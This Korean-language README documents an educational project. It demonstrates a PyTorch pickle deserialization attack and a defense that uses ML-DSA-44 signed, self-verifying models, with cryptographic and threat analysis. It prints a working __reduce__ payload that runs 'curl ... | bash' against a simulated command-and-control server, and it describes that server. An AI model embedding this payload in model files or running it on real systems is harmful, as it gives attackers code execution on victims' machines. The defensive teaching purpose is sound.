# PyTorch 모델 Pickle 취약점 시연 및 방어 시스템

PyTorch 모델의 Pickle 직렬화 취약점을 교육 목적으로 시연하고, ML-DSA-44 전자서명을 이용한 자기 검증 모델(Self-Verifying Model)로 방어하는 시스템입니다.

> ⚠️ **경고**: 이 프로젝트는 교육 및 연구 목적으로만 사용되어야 합니다. 실제 악의적인 목적으로 사용하지 마십시오.

---

## 📚 목차

1. [프로젝트 개요](#프로젝트-개요)
2. [주요 기능](#주요-기능)
3. [디렉토리 구조](#디렉토리-구조)
4. [사전 요구사항](#사전-요구사항)
5. [설치 방법](#설치-방법)
6. [프로그램 실행 순서](#프로그램-실행-순서)
7. [각 프로그램 상세 설명](#각-프로그램-상세-설명)
8. [기술 스택](#기술-스택)
9. [보안 및 암호학](#보안-및-암호학)
10. [학습 목표](#학습-목표)
11. [참고 자료](#참고-자료)

---

## 🎯 프로젝트 개요

### 문제점: Pickle 직렬화 취약점

PyTorch는 모델을 저장할 때 Python의 `pickle` 모듈을 사용합니다. 하지만 pickle은 임의의 Python 객체를 직렬화할 수 있어, 악의적인 코드를 포함한 객체를 만들 수 있습니다. 특히 `__reduce__()` 메서드를 악용하면 모델 로딩 시 자동으로 악성 코드가 실행됩니다.

### 해결책: 자기 검증 모델 (Self-Verifying Model)

ML-DSA-44 (NIST FIPS 204) 전자서명을 사용하여 모델에 서명하고, 로딩 시 자동으로 검증하여 변조를 탐지합니다. 이는 다음을 보장합니다:
- **무결성(Integrity)**: 모델이 서명 이후 변조되지 않았음
- **진위성(Authenticity)**: 모델이 신뢰할 수 있는 출처에서 왔음
- **자동 검증**: `torch.load()` 시 자동으로 서명 검증

---

## ✨ 주요 기능

### 공격 시연 (Attack Demonstration)
- Pickle `__reduce__()` 악용
- 악성 페이로드 자동 실행
- CnC(Command & Control) 서버 통신
- 원격 코드 실행(RCE) 시연

### 방어 시스템 (Defense System)
- ML-DSA-44 전자서명 (포스트 양자 암호)
- SHA-256 해시 기반 무결성 검증
- 자동 서명 검증 메커니즘
- 변조 탐지 및 차단

### 분석 도구 (Analysis Tools)
- 공격 체인 상세 분석
- 방어 메커니즘 기술 분석
- 암호학적 프로토콜 분석
- 성능 측정 및 비교

---

## 📁 디렉토리 구조

```
about-pickle_internal/
├── README.md                          # 본 문서
├── models/                            # 원본 모델 저장소
│   ├── small_model.pt                # sentence-transformers/all-MiniLM-L6-v2 (87MB)
│   └── small_model.tar               # 모델 백업
├── models_attack/                     # 공격 모델 저장소 (자동 생성)
│   └── small_normal_malicious.pt     # 악성 페이로드가 삽입된 모델
├── models_defense/                    # 방어 모델 저장소 (자동 생성)
│   ├── small_signed.pt               # 서명된 모델
│   └── small_signed_tampered.pt      # 변조된 서명 모델 (차단 테스트용)
├── data/                              # 로그 및 데이터
│   ├── serverlog.txt                 # CnC 서버 로그
│   └── test_all_models.log           # 전체 테스트 로그
├── uploads/                           # 업로드 파일 저장 (서버용)
│
├── 0_server.py                        # CnC 서버 (공격 인프라)
├── 1_attack.py                        # 공격 스크립트 (악성 모델 생성)
├── 2_victim-load.py                   # 피해자 스크립트 (취약한 로딩)
├── 3_attack_analysis.py               # 공격 체인 분석
├── 4_defense.py                       # 방어 시스템 시연
├── 5_defense_analysis.py              # 방어 메커니즘 기술 분석
│
├── test_all_models.py                 # 종합 테스트 스위트
├── self_verifying_secure.py           # 자기 검증 모델 구현
├── secure_signature.py                # 서명 유틸리티
├── mldsa44_binding.py                 # ML-DSA-44 Python 바인딩
├── server.py                          # HTTP 서버 (원본)
├── attack_demo.sh                     # 공격 성공 시 실행되는 스크립트
│
├── ml_dsa_secret.key                  # ML-DSA-44 비밀키 (2,560 bytes)
├── ml_dsa_public.key                  # ML-DSA-44 공개키 (1,312 bytes)
└── libmldsa44.so                      # ML-DSA-44 C 라이브러리
```

---

## 📋 사전 요구사항

### 시스템 요구사항
- Linux 또는 macOS (WSL2 지원)
- Python 3.8 이상
- 최소 2GB RAM
- 최소 500MB 디스크 공간

### 필수 Python 패키지
```bash
torch>=2.0.0
transformers>=4.30.0
sentence-transformers>=2.2.0
numpy>=1.20.0
```

### 선택 사항
- `curl`: CnC 서버 통신 시연용
- `git`: 버전 관리

---

## 🔧 설치 방법

### 1. Python 패키지 설치

```bash
# pip가 없는 경우 설치
sudo apt-get update
sudo apt-get install python3-pip

# 필수 패키지 설치
python3 -m pip install torch transformers sentence-transformers --break-system-packages
```

### 2. SSL 인증서 생성 (HTTPS 서버용)

```bash
# 자체 서명 인증서 생성 (개발/교육 목적)
openssl req -x509 -newkey rsa:2048 -keyout server.key -out server.crt -days 365 -nodes \
  -subj "/C=KR/ST=Seoul/L=Seoul/O=Demo/CN=localhost"

# 생성된 파일 확인
ls -lh server.crt server.key
# server.crt: SSL 인증서 (~1.3 KB)
# server.key: 개인키 (~1.7 KB)
```

> ⚠️ **주의**: 이 인증서는 자체 서명(self-signed)이므로 브라우저에서 경고가 표시됩니다. 교육 목적이므로 안전하게 무시할 수 있습니다.

### 3. 모델 다운로드

`models/small_model.pt` 파일이 없는 경우:

```python
# Python 스크립트로 다운로드
import torch
from transformers import AutoModel

model = AutoModel.from_pretrained("sentence-transformers/all-MiniLM-L6-v2")
torch.save(model, "models/small_model.pt")
```

### 4. ML-DSA-44 라이브러리 확인

```bash
# 라이브러리 존재 확인
ls -lh libmldsa44.so

# 키 파일 확인
ls -lh ml_dsa_*.key
```

---

## 🚀 프로그램 실행 순서

### 📌 전체 실행 흐름도

```
1. [0_server.py]          CnC 서버 시작 (백그라운드)
       ↓
2. [1_attack.py]          악성 모델 생성
       ↓
3. [2_victim-load.py]     공격 시연 (악성 모델 로딩)
       ↓
4. [3_attack_analysis.py] 공격 체인 분석
       ↓
5. [4_defense.py]         방어 시스템 시연
       ↓
6. [5_defense_analysis.py] 방어 메커니즘 기술 분석
```

### 실행 명령어

#### Step 0: CnC 서버 시작 (터미널 1)

```bash
# 서버 로그를 파일에 저장하면서 실행
python3 -u 0_server.py 2>&1 | tee data/serverlog.txt

# 출력:
# ======================================================================
#  Attack Demonstration Server (HTTPS)
# ======================================================================
# Server running on https://localhost:8888
# Attack script: https://localhost:8888/attack_demo.sh
# SSL Certificate: server.crt
# SSL Key: server.key
# ⚠️  Using self-signed certificate (accept security warnings)
```

> 💡 **HTTPS 사용**: 서버는 SSL/TLS 암호화를 사용합니다. `curl` 명령 시 `-k` 플래그로 자체 서명 인증서를 무시합니다.

#### Step 1: 악성 모델 생성 (터미널 2)

```bash
python3 1_attack.py

# 출력:
# ======================================================================
# [ATTACK] Creating Malicious PyTorch Model
# ======================================================================
# [1/3] Loading normal model: models/small_model.pt
# [2/3] Injecting malicious payload...
# [3/3] Saving malicious model: models_attack/small_normal_malicious.pt
# ✓ Malicious model saved successfully
```

#### Step 2: 공격 시연 (피해자 역할)

```bash
python3 2_victim-load.py

# 출력:
# ⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠
# WARNING: VULNERABLE CODE DEMONSTRATION
# ⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠
# ...
# ──────────────────────────────────────────────────────────────────
# [DANGER] ATTACK EXECUTED!
# [DANGER] Malicious payload was triggered during unpickling
# ──────────────────────────────────────────────────────────────────
```

> 💡 **이 때 터미널 1의 서버 로그에 공격 성공 로그가 표시됩니다!**

#### Step 3: 공격 체인 분석

```bash
python3 3_attack_analysis.py

# 출력: 전체 공격 과정 상세 분석 (6개 STEP)
# - Pickle 취약점 설명
# - __reduce__() 메커니즘
# - CnC 통신 분석
# - 서버 로그 분석
```

#### Step 4: 방어 시스템 시연

```bash
python3 4_defense.py

# 출력:
# ======================================================================
#  SELF-VERIFYING MODEL DEFENSE DEMONSTRATION
# ======================================================================
# STEP 1: Loading Source Model
# STEP 2: Creating Self-Verifying Model with ML-DSA-44 Signature
#    ✓ Signing completed in 6076.54 ms
# STEP 3: Verifying Signed Model (Normal Case)
#    ✅ VERIFICATION SUCCESSFUL!
# STEP 4: Attempting to Inject Malicious Payload
# STEP 5: Attempting to Load Tampered Model
#    ✅ DEFENSE SUCCESSFUL! 🛡️
#    ✓ Tampered model BLOCKED!
```

#### Step 5: 방어 메커니즘 기술 분석

```bash
python3 5_defense_analysis.py

# 출력: 8개 섹션의 상세 기술 분석
# - ML-DSA-44 알고리즘 수학적 구조
# - SHA-256 암호학적 해시
# - 서명 생성/검증 프로토콜
# - 파일 구조 바이트 레벨 분석
# - 보안 보장 및 위협 모델
```

---

## 📖 각 프로그램 상세 설명

### 0_server.py - CnC 서버 (Command & Control)

**목적**: 공격자의 원격 서버 시뮬레이션

**기능**:
- **HTTPS 서버** (포트 8888, SSL/TLS 암호화)
- `attack_demo.sh` 스크립트 제공
- 공격 성공 로그 기록
- 파일 업로드 엔드포인트 (`POST /upload`)

**기술적 세부사항**:
- `http.server.HTTPServer` + `ssl.SSLContext` 사용
- SSL/TLS 프로토콜로 암호화된 통신
- `BaseHTTPRequestHandler` 커스텀 핸들러
- 타임스탬프가 포함된 로그 기록
- 자체 서명 인증서 사용 (server.crt, server.key)

**실행 방법**:
```bash
# 로그를 파일에 저장하며 실행
python3 -u 0_server.py 2>&1 | tee data/serverlog.txt

# `-u`: unbuffered 출력 (실시간 로그)
# `tee`: 화면과 파일에 동시 출력
```

**출력 예시**:
```
======================================================================
 Attack Demonstration Server (HTTPS)
======================================================================
Server running on https://localhost:8888
Attack script: https://localhost:8888/attack_demo.sh
Upload endpoint: POST to https://localhost:8888/upload
Upload directory: /home/user/about-pickle_internal/uploads
SSL Certificate: server.crt
SSL Key: server.key
======================================================================
⚠️  Using self-signed certificate (accept security warnings)

[2025-12-30 11:27:46] [Attack Succeed] Attack script downloaded from 127.0.0.1
```

---

### 1_attack.py - 악성 모델 생성

**목적**: Pickle 취약점을 이용한 악성 모델 생성

**공격 메커니즘**:
1. 정상 모델 로드 (`models/small_model.pt`)
2. `MaliciousPayload` 클래스 정의 (악성 페이로드)
3. 모델에 악성 객체 주입
4. 변조된 모델 저장 (`models_attack/small_normal_malicious.pt`)

**핵심 코드**:
```python
class MaliciousPayload:
    def __reduce__(self):
        import os
        return (os.system, ('curl -k -s https://localhost:8888/attack_demo.sh | bash',))
```

**`__reduce__()` 메서드**:
- Pickle이 객체를 직렬화할 때 호출
- `(callable, args)` 튜플 반환
- Unpickle 시 `callable(*args)` 자동 실행
- 여기서는 `os.system('curl -k ... | bash')` 실행

**페이로드 동작**:
1. `curl -k`로 HTTPS CnC 서버에서 스크립트 다운로드
   - `-k`: 자체 서명 인증서 무시 (insecure)
   - `-s`: 진행 상황 숨김 (silent)
2. `bash`로 스크립트 실행
3. 원격 코드 실행(RCE) 달성

> 🔒 **HTTPS 통신**: 악성 페이로드도 암호화된 연결을 사용하여 탐지를 어렵게 만듭니다.

**실행 결과**:
- 입력: `models/small_model.pt` (87.18 MB)
- 출력: `models_attack/small_normal_malicious.pt` (87.18 MB)
- 페이로드 오버헤드: ~1.75 KB (0.0020%)

---

### 2_victim-load.py - 피해자 모델 로딩

**목적**: 취약한 모델 로딩 시연 (공격 트리거)

**시나리오**:
사용자가 신뢰할 수 없는 출처에서 다운로드한 모델을 로딩하는 상황

**취약한 코드**:
```python
# VULNERABLE!
model = torch.load('models_attack/small_normal_malicious.pt', weights_only=False)
```

**실행 흐름**:
1. 사용자에게 경고 메시지 표시
2. Enter 키로 확인
3. `torch.load()` 실행
4. Pickle이 `MaliciousPayload` 역직렬화
5. `__reduce__()` 자동 호출
6. `os.system('curl -k ... | bash')` 실행
7. HTTPS로 CnC 서버에서 `attack_demo.sh` 다운로드 및 실행
8. 공격 성공 메시지 표시

**공격 성공 증거**:
- 터미널에 "Your device is hacked" 메시지
- 서버 로그에 접속 기록
- 현재 사용자 및 디렉토리 정보 출력

**교육적 가치**:
- `weights_only=False`의 위험성 인식
- Pickle 역직렬화 취약점 이해
- 신뢰할 수 없는 모델 로딩의 위험성

---

### 3_attack_analysis.py - 공격 체인 분석

**목적**: 전체 공격 프로세스를 단계별로 분석하고 설명

**분석 내용**:

#### STEP 0: 공격 체인 개요
- 4개 컴포넌트 (0_server.py, 1_attack.py, 2_victim-load.py, serverlog.txt)
- 공격 흐름도 ASCII 아트
- 각 단계별 역할 설명

#### STEP 1: CnC 서버 분석
- CnC 서버의 개념 및 역할
- 포트 8888에서 제공하는 서비스
- 로그 기록 메커니즘

#### STEP 2: Pickle 취약점 이해
- **Pickle이란?**: Python 직렬화 형식
- **`__reduce__()` 취약점**:
  - 역직렬화 시 자동 호출
  - `(function, args)` 형태로 반환
  - Unpickle 시 `function(*args)` 자동 실행
- **악용 메커니즘**:
  - `MaliciousPayload` 클래스 분석
  - `os.system()` 호출 방식
  - CnC URL 추출 및 분석

#### STEP 3: 모델 파일 비교
- 정상 모델 vs 악성 모델 크기 비교
- 페이로드 오버헤드: 1.75 KB (0.0020%)
- 파일 크기로는 탐지 불가능

#### STEP 4: 피해자 로딩 프로세스
- `torch.load()` 내부 동작
- Unpickling 타임라인 (0.000s ~ 0.400s)
- 악성 코드 실행 시점

#### STEP 5: 서버 로그 분석
- `data/serverlog.txt` 읽기
- 공격 성공 여부 판단
- 타임스탬프 및 IP 주소 추출
- 실제 공격 증거 제시

#### STEP 6: 방어 및 완화 전략
- `weights_only=True` 사용
- 서명 검증 (이 프로젝트!)
- 샌드박싱
- 코드 리뷰
- 네트워크 모니터링

**출력 형식**:
- 각 섹션별 상세 설명
- 코드 스니펫 및 예시
- 경고 및 권장사항
- 최종 요약 및 학습 목표

---

### 4_defense.py - 방어 시스템 시연

**목적**: ML-DSA-44 서명을 이용한 변조 탐지 시스템 시연

**방어 메커니즘**:

#### STEP 1: 원본 모델 로드
```python
model = torch.load('models/small_model.pt', weights_only=False)
```

#### STEP 2: ML-DSA-44 서명 생성
```python
result = create_self_verifying_model(
    model_path='models/small_model.pt',
    secret_key_path='ml_dsa_secret.key',
    public_key_path='ml_dsa_public.key',
    output_path='models_defense/small_signed.pt'
)
```

**서명 프로세스**:
1. 모델 직렬화: `model_data_bytes = pickle.dumps(model)`
2. SHA-256 해싱: `hash = SHA-256(model_data_bytes)`
3. ML-DSA-44 서명: `signature = Sign(secret_key, hash)`
4. SelfVerifier 객체 생성: `(model_data_bytes, signature, public_key)`
5. 저장: `torch.save(SelfVerifier, output_path)`

**성능**:
- 해싱 시간: ~60 ms
- 서명 시간: ~2 ms
- 총 시간: ~6,076 ms (직렬화 포함)
- 오버헤드: -13.34 KB (압축 효과)

#### STEP 3: 서명된 모델 검증 (정상)
```python
model = torch.load('models_defense/small_signed.pt', weights_only=False)
# ✅ 자동으로 서명 검증 → 성공
```

**검증 프로세스**:
1. `torch.load()` → SelfVerifier 역직렬화
2. `__reduce__()` 자동 호출
3. `_verify_and_restore()` 실행:
   - SHA-256 해시 재계산
   - ML-DSA-44 서명 검증
   - 검증 성공 → 원본 모델 반환
4. 검증 시간: ~865 ms

#### STEP 4: 변조 시도
```python
# 서명된 모델 로드
verifier = torch.load('models_defense/small_signed.pt')

# 모델 데이터 추출 및 변조
model = pickle.loads(verifier.model_data_bytes)
model['__malicious_payload__'] = MaliciousPayload()

# 변조된 데이터로 재직렬화
verifier.model_data_bytes = pickle.dumps(model)

# 저장 (서명은 원본 그대로!)
torch.save(verifier, 'models_defense/small_signed_tampered.pt')
```

**변조 내용**:
- ✓ `model_data_bytes`: **변경됨** (악성 페이로드 포함)
- ✗ `signature`: 변경 없음 (원본 해시에 대한 서명)
- ✗ `public_key`: 변경 없음

#### STEP 5: 변조된 모델 로딩 시도 → **차단!**
```python
try:
    model = torch.load('models_defense/small_signed_tampered.pt')
except ValueError as e:
    # ✅ DEFENSE SUCCESSFUL!
    # 서명 검증 실패 → ValueError 발생
    # 악성 코드 실행 차단
```

**차단 메커니즘**:
1. `__reduce__()` 호출
2. 변조된 `model_data_bytes`의 해시 계산
3. 계산된 해시 ≠ 서명된 해시 (원본과 다름)
4. ML-DSA-44 검증 실패
5. `ValueError` 발생 → 로딩 차단

#### STEP 6: 비교 분석
| 항목 | 서명 없는 모델 | 자기 검증 모델 |
|------|---------------|----------------|
| 악성 코드 주입 | ✅ 성공 | ❌ 차단 |
| 보안 수준 | 없음 | ML-DSA-44 (143-bit) |
| 검증 시간 | - | ~865 ms |
| 오버헤드 | - | ~4 KB |

**교육적 가치**:
- 전자서명의 원리 이해
- 무결성 보장 메커니즘
- 자동 검증의 중요성
- 포스트 양자 암호학 소개

---

### 5_defense_analysis.py - 방어 메커니즘 기술 분석

**목적**: 방어 시스템의 암호학적 세부사항을 깊이 있게 분석

**분석 섹션**:

#### SECTION 1: ML-DSA-44 알고리즘 상세

**수학적 기초**:
- **Ring**: R = Z_q[X]/(X^n + 1)
  - q = 8,380,417 (소수)
  - n = 256 (차수)
- **Module 차원**: k=4 (행), l=4 (열)
- **공개 행렬**: A ∈ R^(k×l)
- **비밀키**: (s₁, s₂) ∈ R^l × R^k (작은 계수)
- **공개키**: t = A·s₁ + s₂ (mod q)

**서명 알고리즘**:
1. μ ← H(tr || M) (메시지 대표값)
2. y ← ExpandMask(K, μ, κ) (랜덤 마스크)
3. w ← A·y (커밋먼트)
4. c ← H(μ || HighBits(w)) (챌린지)
5. z ← y + c·s₁ (응답)
6. h ← MakeHint(-c·t₀, w - c·s₂ + c·t₀) (힌트)
7. σ = (z, h, c) 반환

**검증 알고리즘**:
1. w' ← A·z - c·t₁·2^d
2. w'₁ ← UseHint(h, w')
3. c' ← H(μ || w'₁)
4. c = c' 및 ||z|| ≤ γ₁ - β 확인

**보안 분석**:
- 고전 컴퓨터: ~2^143 연산 필요
- 양자 컴퓨터: ~2^71 연산 필요 (Grover)
- NIST 보안 레벨 2 (AES-128 상당)

**키 크기 분석**:
- 비밀키: 2,560 bytes
- 공개키: 1,312 bytes
- 서명: 2,420 bytes (고정)
- 바이트 레벨 hexdump 제공

#### SECTION 2: SHA-256 해시 함수

**내부 구조**:
- Merkle-Damgård 구성
- Davies-Meyer 압축 함수
- 512-bit 블록 처리
- 256-bit 출력

**초기 상태**:
```
H₀ = 0x6a09e667  (√2의 소수부 첫 32비트)
H₁ = 0xbb67ae85  (√3의 소수부 첫 32비트)
...
```

**압축 함수**:
- 64라운드 반복
- 논리 함수: Ch, Maj, Σ₀, Σ₁, σ₀, σ₁
- 각 라운드에서 상수 K_t 및 메시지 W_t 사용

**보안 특성**:
- Pre-image 저항: 2^256 연산
- Second pre-image 저항: 2^256 연산
- Collision 저항: 2^128 연산 (생일 공격)

**성능 측정**:
- 데이터 크기: 87.16 MB
- 해싱 시간: 73.97 ms
- **처리량: 1,178 MB/s**

#### SECTION 3: 서명 생성 프로토콜

**5단계 워크플로우**:

1. **모델 직렬화**
   - `pickle.dumps(model, protocol=4)`
   - 결정적 출력 (같은 모델 → 같은 바이트)

2. **암호학적 해싱**
   - `SHA-256(model_data_bytes)`
   - 32 bytes 다이제스트

3. **전자서명 생성**
   - `ML-DSA-44.Sign(secret_key, hash)`
   - 거부 샘플링 (~4.5회 평균)

4. **SelfVerifier 객체**
   ```python
   class SelfVerifier:
       model_data_bytes: bytes  # 91 MB
       signature: bytes         # 2,420 bytes
       public_key: bytes        # 1,312 bytes
   ```

5. **영속화**
   - `torch.save(SelfVerifier, path)`
   - Pickle protocol 4

**오버헤드 분석**:
- 공개키: 1,312 bytes
- 서명: 2,420 bytes
- 메타데이터: ~500 bytes
- Pickle 압축: -17,894 bytes
- **총 오버헤드: -13,662 bytes** (압축 효과!)

#### SECTION 4: 서명 검증 프로토콜

**자동 검증 메커니즘**:

1. **파일 로딩**
   - `torch.load(path)` → Pickle 역직렬화

2. **`__reduce__()` 훅**
   ```python
   def __reduce__(self):
       return (_verify_and_restore, (
           self.model_data_bytes,
           self.signature,
           self.public_key
       ))
   ```

3. **해시 재계산**
   - `computed_hash = SHA-256(model_data_bytes)`

4. **서명 검증**
   - `ML-DSA-44.Verify(public_key, computed_hash, signature)`

5. **결과 처리**
   - 유효 → 원본 모델 반환
   - 무효 → `ValueError` 발생

**검증 시간**:
- 유효 모델: ~528 ms
- 변조 모델 탐지: ~1,073 ms

#### SECTION 5: 변조 탐지 메커니즘

**공격 시나리오 분석**:

공격자가 `model_data_bytes`를 변조한 경우:
```
original_hash = SHA-256(original_model_data_bytes)  # 서명 시
computed_hash = SHA-256(tampered_model_data_bytes)  # 로드 시

original_hash ≠ computed_hash  (SHA-256 collision 저항)
↓
Verify(public_key, computed_hash, signature) = INVALID
↓
ValueError 발생 → 로딩 차단
```

**수학적 보장**:
```
P(공격 성공) ≤ P(SHA-256 충돌) + P(ML-DSA-44 위조)
             ≤ 2^(-256) + 2^(-143)
             ≈ 2^(-143)
```
→ 계산적으로 불가능!

**바이트 레벨 분석**:
- 정상 해시 vs 변조 해시 hexdump
- 서명 일치 여부 확인
- 검증 실패 원인 규명

#### SECTION 6: 파일 구조 분석

**Pickle Protocol 4 구조**:
```
Offset  Content
------  -------
0x00    \x80\x04  (Protocol 4 marker)
0x02    \x95      (FRAME opcode)
0x03    [4-byte frame size]
0x07    [Pickle opcodes...]
...     [model_data_bytes - BINBYTES8]
...     [signature - BINBYTES]
...     [public_key - BINBYTES]
...     \x2e      (STOP opcode)
```

**주요 Opcode**:
- `\x80\x04`: Protocol 4 헤더
- `\x95`: FRAME (대용량 데이터 프레임)
- `\x8e`: BINBYTES8 (8-byte 길이 + 데이터)
- `\x63`: GLOBAL (클래스 임포트)
- `\x52`: REDUCE (함수 호출)

**보안 고려사항**:
- SelfVerifier의 `__reduce__()` 먼저 실행
- 검증 **실패 시** 모델 코드 실행 전 차단
- 악성 `__reduce__()`가 실행되기 전 방어

#### SECTION 7: 보안 분석

**보호되는 위협**:
- ✅ 모델 변조 (악성 코드 주입)
- ✅ 중간자 공격 (전송 중 변조)
- ✅ 저장소 침해 (악성 모델 업로드)
- ✅ 공급망 공격 (배포 지점 변조)
- ✅ 백도어 주입
- ✅ 파라미터 조작

**보호되지 않는 위협**:
- ❌ 비밀키 침해 (공격자가 서명 가능)
- ❌ 내부자 위협 (정당한 키로 악성 모델 서명)
- ❌ 양자 컴퓨터 (Shor 알고리즘, 2^71 연산)
- ❌ 원본 모델의 백도어 (서명 전 존재)

**대안 방어법 비교**:
1. `weights_only=True`: 간단하지만 많은 모델 지원 불가
2. 외부 해시: 별도 채널 필요, 검증 생략 가능
3. 코드 서명: OS 통합, ML 특화 아님
4. **자기 검증**: 자동, ML 특화, 독립적 ✅

#### SECTION 8: 성능 분석

**해싱 성능**:
- 선형 복잡도: O(n)
- 100 MB: ~60-90 ms
- 1 GB: ~600-900 ms
- 10 GB: ~6-9 초
- 처리량: ~1 GB/s (SHA-NI 사용 시 3-5 GB/s)

**서명 성능**:
- 상수 시간: O(1)
- 서명: ~1-5 ms
- 검증: ~1-3 ms
- 모델 크기 무관

**최적화 방안**:
1. 하드웨어 가속 (SHA-NI)
2. 병렬 해싱 (멀티코어)
3. 증분 검증 (레이어별)
4. 캐시된 검증 (해시 기반)
5. 지연 검증 (첫 사용 시)

---

## 🔬 기술 스택

### 암호학 (Cryptography)

#### ML-DSA-44 (Module-Lattice Digital Signature Algorithm)
- **표준**: NIST FIPS 204 (2024)
- **타입**: 포스트 양자 전자서명
- **기반**: Module-LWE (Learning With Errors)
- **보안 레벨**: NIST Level 2 (AES-128 상당)
- **비밀키**: 2,560 bytes
- **공개키**: 1,312 bytes
- **서명**: 2,420 bytes
- **구현**: C 라이브러리 + Python 바인딩

#### SHA-256
- **표준**: NIST FIPS 180-4
- **타입**: 암호학적 해시 함수
- **출력**: 256 bits (32 bytes)
- **블록**: 512 bits (64 bytes)
- **보안**: Pre-image(2^256), Collision(2^128)

### 머신러닝 (Machine Learning)

#### PyTorch
- **버전**: 2.9.1
- **용도**: 모델 저장/로드, 직렬화
- **직렬화**: Pickle protocol 4

#### Transformers
- **버전**: 4.57.3
- **용도**: HuggingFace 모델 로드
- **모델**: sentence-transformers/all-MiniLM-L6-v2

#### Sentence-Transformers
- **버전**: 5.2.0
- **용도**: 임베딩 모델
- **크기**: 87 MB

### Python 표준 라이브러리

- `pickle`: 객체 직렬화/역직렬화
- `hashlib`: SHA-256 해싱
- `http.server`: CnC 서버 구현
- `struct`: 바이너리 데이터 파싱
- `ctypes`: C 라이브러리 바인딩

---

## 🔐 보안 및 암호학

### 암호학적 프로토콜

#### 서명 생성 (Signing)
```
1. model_bytes ← Serialize(model)
2. hash ← SHA-256(model_bytes)
3. signature ← ML-DSA-44.Sign(secret_key, hash)
4. verifier ← SelfVerifier(model_bytes, signature, public_key)
5. Save(verifier, output_path)
```

#### 서명 검증 (Verification)
```
1. verifier ← Load(signed_model_path)
2. computed_hash ← SHA-256(verifier.model_bytes)
3. is_valid ← ML-DSA-44.Verify(verifier.public_key, computed_hash, verifier.signature)
4. if is_valid:
       return Deserialize(verifier.model_bytes)
   else:
       raise ValueError("Signature verification failed!")
```

### 보안 보장 (Security Guarantees)

1. **무결성 (Integrity)**
   - SHA-256 collision 저항 (2^128)
   - 1-bit 변조 시 검증 실패

2. **진위성 (Authenticity)**
   - ML-DSA-44 위조 불가능 (2^143)
   - 비밀키 없이 서명 생성 불가

3. **부인방지 (Non-Repudiation)**
   - 서명자가 서명 사실 부인 불가
   - 공개키로 검증 가능

4. **자동성 (Automation)**
   - `__reduce__()` 훅으로 자동 검증
   - 검증 생략 불가능

### 위협 모델 (Threat Model)

**가정**:
- 공격자가 네트워크 트래픽 제어 가능
- 공격자가 모델 파일 수정 가능
- 비밀키는 안전하게 보관됨
- 암호학적 기본 가정 성립 (SHA-256, ML-DSA-44)

**공격 시나리오**:
1. Man-in-the-Middle: 전송 중 모델 변조 → **차단**
2. Malicious Repository: 악성 모델 업로드 → **차단**
3. File Tampering: 로컬 파일 변조 → **차단**
4. Secret Key Compromise: 비밀키 유출 → **방어 불가**

---

## 🎓 학습 목표

### 공격 부분 (1_attack.py ~ 3_attack_analysis.py)

학생들은 다음을 학습합니다:

1. **Pickle 취약점 이해**
   - Pickle이 무엇이고 왜 위험한가?
   - `__reduce__()` 메서드의 역할
   - 역직렬화 시 코드 실행 메커니즘

2. **공격 기법**
   - 악성 페이로드 설계 방법
   - CnC 서버 통신 방식
   - 원격 코드 실행(RCE) 달성 과정

3. **보안 위협**
   - 신뢰할 수 없는 소스의 위험
   - 공급망 공격의 실체
   - AI/ML 모델의 보안 중요성

### 방어 부분 (4_defense.py ~ 5_defense_analysis.py)

학생들은 다음을 학습합니다:

1. **암호학 기초**
   - 전자서명의 원리
   - 해시 함수의 역할
   - 공개키 암호학

2. **방어 메커니즘**
   - 서명 생성 프로세스
   - 자동 검증 구현
   - 변조 탐지 원리

3. **포스트 양자 암호**
   - ML-DSA-44 알고리즘
   - 양자 컴퓨터 위협
   - NIST 표준화

4. **실무 적용**
   - 모델 배포 시 보안
   - 키 관리 모범 사례
   - 방어 계층화 (Defense in Depth)

---

## ⚠️ 보안 경고

### 이 프로젝트는 교육 목적입니다!

1. **실제 악용 금지**
   - 이 코드를 악의적 목적으로 사용하지 마십시오
   - 허가 없이 타인의 시스템을 공격하지 마십시오
   - 법적 책임은 사용자에게 있습니다

2. **격리된 환경에서만 실행**
   - 가상 머신 또는 Docker 컨테이너 사용 권장
   - 중요한 데이터가 있는 시스템에서 실행 금지
   - 네트워크 격리 고려

3. **비밀키 보안**
   - `ml_dsa_secret.key`를 안전하게 보관
   - Git에 커밋하지 마십시오
   - 프로덕션에서는 HSM 사용 권장

4. **CnC 서버 주의**
   - 로컬호스트에서만 실행
   - 외부 접근 차단
   - 방화벽 규칙 설정

---

## 📚 참고 자료

### 표준 문서
- [NIST FIPS 204: ML-DSA](https://csrc.nist.gov/pubs/fips/204/final)
- [NIST FIPS 180-4: SHA-256](https://csrc.nist.gov/pubs/fips/180-4/upd1/final)
- [Python Pickle Protocol](https://docs.python.org/3/library/pickle.html)

### PyTorch 문서
- [PyTorch Serialization](https://pytorch.org/docs/stable/notes/serialization.html)
- [PyTorch Security](https://pytorch.org/docs/stable/notes/security.html)

### 학술 논문
- Dilithium: Module-Lattice-Based Digital Signatures (CRYSTALS)
- The Security of Machine Learning Models
- Supply Chain Attacks in AI Systems

### 추가 읽기
- [OWASP Machine Learning Security](https://owasp.org/www-project-machine-learning-security-top-10/)
- [Adversarial ML Reading List](https://github.com/yenchenlin/awesome-adversarial-machine-learning)

---

## 👥 기여자 및 라이선스

### 개발 목적
교육 및 연구용 시연 프로젝트

### 라이선스
MIT License (교육 목적)

### 면책 조항
이 프로젝트는 교육 목적으로만 제공됩니다. 실제 공격에 사용하거나, 허가 없이 타인의 시스템을 테스트하는 것은 불법입니다. 사용자의 행위에 대한 모든 법적 책임은 사용자에게 있습니다.

---

## 📞 문의

질문이나 제안 사항이 있으시면 GitHub Issues를 통해 문의해주세요.

**Happy Learning! 🎓🔐**
